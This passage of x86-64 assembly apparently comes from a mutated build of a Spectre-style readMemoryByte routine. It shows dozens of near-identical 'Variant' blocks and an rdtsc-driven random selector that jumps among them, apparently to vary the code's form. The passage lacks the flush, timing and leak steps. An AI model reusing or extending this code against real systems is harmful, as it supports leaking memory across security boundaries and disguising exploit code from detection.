	jmp	.LreadMemoryByte_win2_continue
## Variant 74
.LreadMemoryByte_win2_var74:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 75
.LreadMemoryByte_win2_var75:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 76
.LreadMemoryByte_win2_var76:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 77
.LreadMemoryByte_win2_var77:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 78
.LreadMemoryByte_win2_var78:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 79
.LreadMemoryByte_win2_var79:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 80
.LreadMemoryByte_win2_var80:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 81
.LreadMemoryByte_win2_var81:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 82
.LreadMemoryByte_win2_var82:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 83
.LreadMemoryByte_win2_var83:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 84
.LreadMemoryByte_win2_var84:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 85
.LreadMemoryByte_win2_var85:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 86
.LreadMemoryByte_win2_var86:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 87
.LreadMemoryByte_win2_var87:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 88
.LreadMemoryByte_win2_var88:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 89
.LreadMemoryByte_win2_var89:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 90
.LreadMemoryByte_win2_var90:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 91
.LreadMemoryByte_win2_var91:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 92
.LreadMemoryByte_win2_var92:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 93
.LreadMemoryByte_win2_var93:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 94
.LreadMemoryByte_win2_var94:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 95
.LreadMemoryByte_win2_var95:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 96
.LreadMemoryByte_win2_var96:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 97
.LreadMemoryByte_win2_var97:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 98
.LreadMemoryByte_win2_var98:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 99
.LreadMemoryByte_win2_var99:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
.LreadMemoryByte_win2_continue:
	addq	$32, %rsp
	addl	$2, %eax
	leal	(%rax,%rax), %ecx
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win1_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win1_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win1_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win1_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win1_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win1_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win1_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win1_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win1_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win1_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win1_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win1_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win1_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win1_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win1_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win1_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win1_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win1_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win1_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win1_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win1_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win1_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win1_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win1_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win1_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win1_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win1_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win1_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win1_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win1_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win1_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win1_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win1_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win1_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win1_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win1_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win1_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win1_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win1_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win1_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win1_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win1_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win1_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win1_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win1_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win1_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win1_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win1_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win1_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win1_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win1_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win1_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win1_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win1_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win1_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win1_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win1_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win1_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win1_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win1_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win1_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win1_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win1_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win1_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win1_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win1_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win1_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win1_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win1_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win1_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win1_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win1_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win1_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win1_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win1_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win1_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win1_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win1_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win1_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win1_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win1_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win1_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win1_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win1_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win1_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win1_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win1_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win1_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win1_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win1_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win1_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win1_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win1_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win1_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win1_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win1_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win1_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win1_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win1_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win1_var99
	jmp	.LreadMemoryByte_win1_var0
## Variant 0
.LreadMemoryByte_win1_var0:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 1
.LreadMemoryByte_win1_var1:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 2
.LreadMemoryByte_win1_var2:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 3
.LreadMemoryByte_win1_var3:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 4
.LreadMemoryByte_win1_var4:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 5
.LreadMemoryByte_win1_var5:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 6
.LreadMemoryByte_win1_var6:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 7
.LreadMemoryByte_win1_var7:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 8
.LreadMemoryByte_win1_var8:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 9
.LreadMemoryByte_win1_var9:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 10
.LreadMemoryByte_win1_var10:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 11
.LreadMemoryByte_win1_var11:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 12
.LreadMemoryByte_win1_var12:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 13
.LreadMemoryByte_win1_var13:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 14
.LreadMemoryByte_win1_var14:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 15
.LreadMemoryByte_win1_var15:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 16
.LreadMemoryByte_win1_var16:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 17
.LreadMemoryByte_win1_var17:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 18
.LreadMemoryByte_win1_var18:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 19
.LreadMemoryByte_win1_var19:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 20
.LreadMemoryByte_win1_var20:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 21
.LreadMemoryByte_win1_var21:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 22
.LreadMemoryByte_win1_var22:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 23
.LreadMemoryByte_win1_var23:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 24
.LreadMemoryByte_win1_var24:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 25
.LreadMemoryByte_win1_var25:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 26
.LreadMemoryByte_win1_var26:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 27
.LreadMemoryByte_win1_var27:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 28
.LreadMemoryByte_win1_var28:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 29
.LreadMemoryByte_win1_var29:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 30
.LreadMemoryByte_win1_var30:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 31
.LreadMemoryByte_win1_var31:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 32
.LreadMemoryByte_win1_var32:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 33
.LreadMemoryByte_win1_var33:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 34
.LreadMemoryByte_win1_var34:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 35
.LreadMemoryByte_win1_var35:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 36
.LreadMemoryByte_win1_var36:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 37
.LreadMemoryByte_win1_var37:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 38
.LreadMemoryByte_win1_var38:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 39
.LreadMemoryByte_win1_var39:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 40
.LreadMemoryByte_win1_var40:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 41
.LreadMemoryByte_win1_var41:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 42
.LreadMemoryByte_win1_var42:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 43
.LreadMemoryByte_win1_var43:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 44
.LreadMemoryByte_win1_var44:
	popq	%rax
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
